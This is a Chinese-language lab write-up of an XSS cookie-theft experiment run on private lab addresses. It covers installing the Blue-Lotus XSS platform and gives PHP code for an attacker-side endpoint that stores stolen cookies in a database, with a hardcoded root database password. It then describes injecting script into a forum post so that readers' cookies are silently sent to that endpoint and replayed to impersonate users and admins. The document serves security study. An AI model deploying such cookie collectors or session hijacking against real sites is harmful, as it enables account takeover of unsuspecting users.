[TOC]



# ==XSS获取Cookie实验==

构建文章阅读系统并完善其发帖的功能之后，搭建Blue-Lotus平台

系统开发我不说了，搭建平台只需将获取得到的源码解压存放在httpd的web根目录下就好了，注意修改web服务的配置文件就好了

## 一、搭建Bule-Lotus平台

- 下载好源码，直接去网上搜
- 要么有LNMP环境，要么直接下载apache服务
- nginx的配置文件在 /usr/local/nginx/conf/nginx.conf apache的配置文件在 /etc/httpd/conf/httpd.conf，注意修改nginx配置文件中的root或apache配置文件中的DocumentRoot。我在这里使用的是apache的服务。而我搭建的woniunote使用的是nginx，当然，我完全可以把Blue-Lotus也搭建在nginx上
- 安装php环境
- 源码放在对应的web服务器根目录就好了
- 最后直接访问该服务器的ip地址即可

## 二、正式实验

作为攻击者，我需要事先进入系统发表一篇文章，我在该文章中嵌入我精心构造的js脚本，发表成功之后，当其他用户阅读我这篇文章的时候，一点开，我就可以获得他们的信息，而且他们还要完全不知道，对他们是透明的。一旦获取到他们的细腻些，我就可以通过fiddler或firefox中的http live或bp等来发送请求，更换其中的Cookie字段的值我就可以冒充其他用户了。

### （1）开发XSS实验环境

#### 1、确认实验环境

攻击者服务器：192.168.230.150，将获取到的Cookie数据保存到该服务器的数据库中，运行PHP代码暴露一个接收Cookie的URL地址。

正常Web服务器：192.168.230.147，用于用户正常的访问的目标站点，用户在这里可以阅读和发表文章。

用户浏览器：192.168.230.1，Windows环境，使用Chrome浏览器。

攻击者浏览器：192.168.230.1，Windows环境，使用firefox浏览器。

#### 2、创建数据表xssdata

![image-20240723214051415](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240723214051415.png)

#### 3、编写服务器接收代码

这份代码的用处是，当用户访问到了我所发表的文章之后，我嵌入的恶意代码将用户的信息发送给我的这份代码，然后我的这份代码对用户信息做处理并存起来

这份代码的地址为 http://192.168.230.150:88/xssreceive.php

```php
    // 下面是一段PHP后端代码，用来接收处理发来的信息并存在数据库中
    $ipaddr = $_SERVER["REMOTE_ADDR"];
    $url = $_GET['url'];
    $Cookie = $_GET['Cookie'];
    $conn = new mysqli('192.168.230.150','root','p-0p-0p-0','woniunote',3306) or die("数据库连接失败");
    // $conn->query('set names utf8');
    $conn->set_charset('utf8');

    $sql = 'insert into xssdata(ipaddr,url,Cookie,createtime) values(?,?,?,now());';
    $stmt = $conn->prepare($sql);
    $stmt->bind_param('sss',$ipaddr,$url,$Cookie);
    $stmt->execute();
    $stmt->close();
    $conn->close();

    // echo "<script>history.back();</script>";
    // echo "<script>location.href='http://woniuxy.com/'</script>";
```

### （2）实现XSS攻击

#### 1、在页面中注入代码

这份代码的用处是：我注入在我所发表的文章中，当其他用户阅读我这篇文章时，我可以获取到他们的信息，然后发送给我的攻击服务器

注意要做到的是，获取用户信息对于用户来说要是透明的，用户要无感，我们要做的偷偷摸摸的，不知不觉的。

由于我们发送的文章内容会被浏览器引擎所解析，而浏览器会将 + 处理为空格 &及之后的内容清空，所以我们在注入代码时需要对这些特殊字符进行处理，根据ASCII码值进行转换为URL编码（ASCII码值对应的是十进制的数，URL编码对应的是%加十六进制的数）

```js
PHP后台需将 + 号处理为 %2B  将&处理为 %26

```

#### 2、获取Cookie后执行

从数据库中取得用户的Cookie数据：

![image-20240724165024586](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240724165024586.png)

发送到repeater模块

![image-20240724165009058](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240724165009058.png)

修改Cookie字段的值就好了

如果可以用Live HTTP headers就更好了

在Firefox中修改Cookie数据并发送请求，如果管理员访问了我的这篇文章，我还可以越权获得管理员的身份信息。

## Blue-Lotus完成实验

搭建好该平台之后，操作步骤，请看下面这篇文章

[BlueLotus的安装及使用-CSDN博客](https://blog.csdn.net/qq_52358808/article/details/120002782)

**注意在生成payload的时候，一定要在website的url地址后面加上index.php，否则payload根本不生效**

![image-20240724155718330](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240724155718330.png)

